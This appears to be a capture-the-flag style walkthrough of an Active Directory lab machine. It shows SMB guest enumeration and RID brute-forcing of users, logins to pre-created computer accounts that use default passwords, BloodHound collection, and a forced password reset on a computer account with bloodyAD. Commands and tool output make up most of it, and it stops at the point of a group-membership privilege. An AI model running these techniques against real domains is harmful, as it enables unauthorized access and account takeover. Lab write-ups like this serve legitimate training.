# Host file setup
```python
sudo nxc smb 10.129.12.5 --generate-hosts-file /etc/hosts 
[sudo] password for kali: 
SMB         10.129.12.5     445    BLN01            [*] Windows Server 2008 R2 Datacenter 7601 Service Pack 1 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True) (Null Auth:True)
```
Added an entry into `/etc/hosts`

SMB signing is enabled

SMBv1 

Null auth enabled

# Enumeration
## Open ports
```python
nmap -p- --min-rate=2000 -sT 10.129.12.5 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-30 15:47 +0100
Nmap scan report for 10.129.12.5
Host is up (0.018s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5722/tcp  open  msdfsr
9389/tcp  open  adws
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49165/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 66.29 seconds
```
## Nmap
```python
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5722,9389 -A --min-rate=2000 -sT 10.129.12.5
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-30 15:49 +0100
Stats: 0:00:11 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 85.71% done; ETC: 15:50 (0:00:02 remaining)
Nmap scan report for BLN01.retro2.vl (10.129.12.5)
Host is up (0.020s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Microsoft DNS 6.1.7601 (1DB15F75) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15F75)
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-30 14:50:06Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro2.vl, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds  Windows Server 2008 R2 Datacenter 7601 Service Pack 1 microsoft-ds (workgroup: RETRO2)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro2.vl, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Service
| ssl-cert: Subject: commonName=BLN01.retro2.vl
| Not valid before: 2026-03-29T14:45:09
|_Not valid after:  2026-09-28T14:45:09
|_ssl-date: 2026-03-30T14:51:39+00:00; +1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: RETRO2
|   NetBIOS_Domain_Name: RETRO2
|   NetBIOS_Computer_Name: BLN01
|   DNS_Domain_Name: retro2.vl
|   DNS_Computer_Name: BLN01.retro2.vl
|   Product_Version: 6.1.7601
|_  System_Time: 2026-03-30T14:50:59+00:00
5722/tcp open  msrpc         Microsoft Windows RPC
9389/tcp open  mc-nmf        .NET Message Framing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 2008|7|Vista|2012|Phone (97%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (97%), Microsoft Windows Vista or Windows 7 (92%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 7 SP1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (89%), Microsoft Windows 7 Professional or Windows 8 (89%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (89%), Microsoft Windows 8.1 Update 1 (89%), Microsoft Windows Phone 7.5 or 8.0 (89%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: BLN01; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
```
DC is running at -1h

# SMB 
Null auth enanbled but cannot use it to enumerate any shares or users
## Guest access
### Shares
```python
nxc smb bln01.retro2.vl -u 'Guest' -p '' --shares
SMB         10.129.12.5     445    BLN01            [*] Windows Server 2008 R2 Datacenter 7601 Service Pack 1 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         10.129.12.5     445    BLN01            [+] retro2.vl\Guest: 
SMB         10.129.12.5     445    BLN01            [*] Enumerated shares
SMB         10.129.12.5     445    BLN01            Share           Permissions     Remark
SMB         10.129.12.5     445    BLN01            -----           -----------     ------
SMB         10.129.12.5     445    BLN01            ADMIN$                          Remote Admin
SMB         10.129.12.5     445    BLN01            C$                              Default share
SMB         10.129.12.5     445    BLN01            IPC$                            Remote IPC
SMB         10.129.12.5     445    BLN01            NETLOGON                        Logon server share 
SMB         10.129.12.5     445    BLN01            Public          READ            
SMB         10.129.12.5     445    BLN01            SYSVOL                          Logon server share
```
Only read access on one share

### Users
```python
nxc smb bln01.retro2.vl -u 'Guest' -p '' --rid-brute             
SMB         10.129.12.5     445    BLN01            [*] Windows Server 2008 R2 Datacenter 7601 Service Pack 1 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         10.129.12.5     445    BLN01            [+] retro2.vl\Guest: 
SMB         10.129.12.5     445    BLN01            498: RETRO2\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.12.5     445    BLN01            500: RETRO2\Administrator (SidTypeUser)
SMB         10.129.12.5     445    BLN01            501: RETRO2\Guest (SidTypeUser)
SMB         10.129.12.5     445    BLN01            502: RETRO2\krbtgt (SidTypeUser)
SMB         10.129.12.5     445    BLN01            512: RETRO2\Domain Admins (SidTypeGroup)
SMB         10.129.12.5     445    BLN01            513: RETRO2\Domain Users (SidTypeGroup)
SMB         10.129.12.5     445    BLN01            514: RETRO2\Domain Guests (SidTypeGroup)
SMB         10.129.12.5     445    BLN01            515: RETRO2\Domain Computers (SidTypeGroup)
SMB         10.129.12.5     445    BLN01            516: RETRO2\Domain Controllers (SidTypeGroup)
SMB         10.129.12.5     445    BLN01            517: RETRO2\Cert Publishers (SidTypeAlias)
SMB         10.129.12.5     445    BLN01            518: RETRO2\Schema Admins (SidTypeGroup)
SMB         10.129.12.5     445    BLN01            519: RETRO2\Enterprise Admins (SidTypeGroup)
SMB         10.129.12.5     445    BLN01            520: RETRO2\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.12.5     445    BLN01            521: RETRO2\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.12.5     445    BLN01            553: RETRO2\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.12.5     445    BLN01            571: RETRO2\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.12.5     445    BLN01            572: RETRO2\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.12.5     445    BLN01            1000: RETRO2\admin (SidTypeUser)
SMB         10.129.12.5     445    BLN01            1001: RETRO2\BLN01$ (SidTypeUser)
SMB         10.129.12.5     445    BLN01            1102: RETRO2\DnsAdmins (SidTypeAlias)
SMB         10.129.12.5     445    BLN01            1103: RETRO2\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.12.5     445    BLN01            1104: RETRO2\staff (SidTypeGroup)
SMB         10.129.12.5     445    BLN01            1105: RETRO2\Julie.Martin (SidTypeUser)
SMB         10.129.12.5     445    BLN01            1106: RETRO2\Clare.Smith (SidTypeUser)
SMB         10.129.12.5     445    BLN01            1107: RETRO2\Laura.Davies (SidTypeUser)
SMB         10.129.12.5     445    BLN01            1108: RETRO2\Rhys.Richards (SidTypeUser)
SMB         10.129.12.5     445    BLN01            1109: RETRO2\Leah.Robinson (SidTypeUser)
SMB         10.129.12.5     445    BLN01            1110: RETRO2\Michelle.Bird (SidTypeUser)
SMB         10.129.12.5     445    BLN01            1111: RETRO2\Kayleigh.Stephenson (SidTypeUser)
SMB         10.129.12.5     445    BLN01            1112: RETRO2\Charles.Singh (SidTypeUser)
SMB         10.129.12.5     445    BLN01            1113: RETRO2\Sam.Humphreys (SidTypeUser)
SMB         10.129.12.5     445    BLN01            1114: RETRO2\Margaret.Austin (SidTypeUser)
SMB         10.129.12.5     445    BLN01            1115: RETRO2\Caroline.James (SidTypeUser)
SMB         10.129.12.5     445    BLN01            1116: RETRO2\Lynda.Giles (SidTypeUser)
SMB         10.129.12.5     445    BLN01            1117: RETRO2\Emily.Price (SidTypeUser)
SMB         10.129.12.5     445    BLN01            1118: RETRO2\Lynne.Dennis (SidTypeUser)
SMB         10.129.12.5     445    BLN01            1119: RETRO2\Alexandra.Black (SidTypeUser)
SMB         10.129.12.5     445    BLN01            1120: RETRO2\Alex.Scott (SidTypeUser)
SMB         10.129.12.5     445    BLN01            1121: RETRO2\Mandy.Davies (SidTypeUser)
SMB         10.129.12.5     445    BLN01            1122: RETRO2\Marilyn.Whitehouse (SidTypeUser)
SMB         10.129.12.5     445    BLN01            1123: RETRO2\Lindsey.Harrison (SidTypeUser)
SMB         10.129.12.5     445    BLN01            1124: RETRO2\Sally.Davey (SidTypeUser)
SMB         10.129.12.5     445    BLN01            1127: RETRO2\ADMWS01$ (SidTypeUser)
SMB         10.129.12.5     445    BLN01            1128: RETRO2\inventory (SidTypeUser)
SMB         10.129.12.5     445    BLN01            1129: RETRO2\services (SidTypeGroup)
SMB         10.129.12.5     445    BLN01            1130: RETRO2\ldapreader (SidTypeUser)
SMB         10.129.12.5     445    BLN01            1131: RETRO2\FS01$ (SidTypeUser)
SMB         10.129.12.5     445    BLN01            1132: RETRO2\FS02$ (SidTypeUser)
```
Using `cut` ive created a user list from this

### `Public` share
```python
smbclient //bln01.retro2.vl/Public -U 'Guest'%''            
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Aug 17 15:30:37 2024
  ..                                  D        0  Sat Aug 17 15:30:37 2024
  DB                                  D        0  Sat Aug 17 13:07:06 2024
  Temp                                D        0  Sat Aug 17 12:58:05 2024

		6290943 blocks of size 4096. 821255 blocks available
smb: \> cd DB\
smb: \DB\> ls
  .                                   D        0  Sat Aug 17 13:07:06 2024
  ..                                  D        0  Sat Aug 17 13:07:06 2024
  staff.accdb                         A   876544  Sat Aug 17 15:30:19 2024

		6290943 blocks of size 4096. 821255 blocks available
smb: \DB\> get staff.accdb
```
Found an interesting file

There was nothing in `Temp`

Since everything about this box is old im thinking i can try the user as the password for the machine accouts

# Compromising `FS01$` and `FS02$` 
```python
nxc ldap bln01.retro2.vl -u 'FS01$' -p 'fs01' -M pre2k -k
LDAP        bln01.retro2.vl 389    BLN01            [*] Windows 7 / Server 2008 R2 Build 7601 (name:BLN01) (domain:retro2.vl) (signing:None) (channel binding:No TLS cert)
LDAP        bln01.retro2.vl 389    BLN01            [+] retro2.vl\FS01$:fs01 
PRE2K       bln01.retro2.vl 389    BLN01            Pre-created computer account: FS01$
PRE2K       bln01.retro2.vl 389    BLN01            Pre-created computer account: FS02$
PRE2K       bln01.retro2.vl 389    BLN01            [+] Found 2 pre-created computer accounts. Saved to /home/kali/.nxc/modules/pre2k/retro2.vl/precreated_computers.txt
PRE2K       bln01.retro2.vl 389    BLN01            [+] Successfully obtained TGT for fs01@retro2.vl
PRE2K       bln01.retro2.vl 389    BLN01            [+] Successfully obtained TGT for fs02@retro2.vl
PRE2K       bln01.retro2.vl 389    BLN01            [+] Successfully obtained TGT for 2 pre-created computer accounts. Saved to /home/kali/.nxc/modules/pre2k/ccache
```
Found two computer accounts that are pre-created

>When a new computer account is configured as "pre-Windows 2000 computer", its password is set based on its name (i.e. lowercase computer name without the trailing `$`). When it isn't, the password is randomly generated.
>- TheHackerRecipes

Conventiently the module in nxc has saved a TGT for both accounts but in this case ill just use the password

# Bloodhound
```python
nxc ldap bln01.retro2.vl --use-kcache --dns-server 10.129.12.5 --bloodhound -c All           
LDAP        bln01.retro2.vl 389    BLN01            [*] Windows 7 / Server 2008 R2 Build 7601 (name:BLN01) (domain:RETRO2.VL) (signing:None) (channel binding:No TLS cert)
LDAP        bln01.retro2.vl 389    BLN01            [+] RETRO2.VL\fs01 from ccache 
LDAP        bln01.retro2.vl 389    BLN01            Resolved collection methods: group, objectprops, dcom, rdp, session, container, acl, psremote, trusts, localadmin
LDAP        bln01.retro2.vl 389    BLN01            Using kerberos auth from ccache
LDAP        bln01.retro2.vl 389    BLN01            Done in 0M 4S
LDAP        bln01.retro2.vl 389    BLN01            Compressing output into /home/kali/.nxc/logs/BLN01_bln01.retro2.vl_2026-03-30_162250_bloodhound.zip
```
Using the TGT i got from nxc i can collect the bloodhound data

![[Pasted image 20260330162750.png]]
As seen from this image i have `ForceChangePassword` on the `ADMWS01`. The same is also true for `FS02` but i have already compromise that computer

# Compromising `admws01$`
```python
bloodyAD -d retro2.vl -u 'FS01$' -k --host bln01.retro2.vl set password 'ADMWS01$' 'dmuhackers123!'
[+] Password changed successfully!
```
This changed the password

```python
nxc smb bln01.retro2.vl -u 'ADMWS01$' -p 'dmuhackers123!'         
SMB         10.129.12.5     445    BLN01            [*] Windows Server 2008 R2 Datacenter 7601 Service Pack 1 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         10.129.12.5     445    BLN01            [+] retro2.vl\ADMWS01$:dmuhackers123!
```
This machine account has now been compromised

This machine account has no extra privs on SMB

## Bloodhound on `ADMWS01$`
![[Pasted image 20260330164333.png]]
As seen here i have privs over the previously compromised machine accounts, this isnt helpful

But i also have `AddMember` and `AddSelf` on the services group

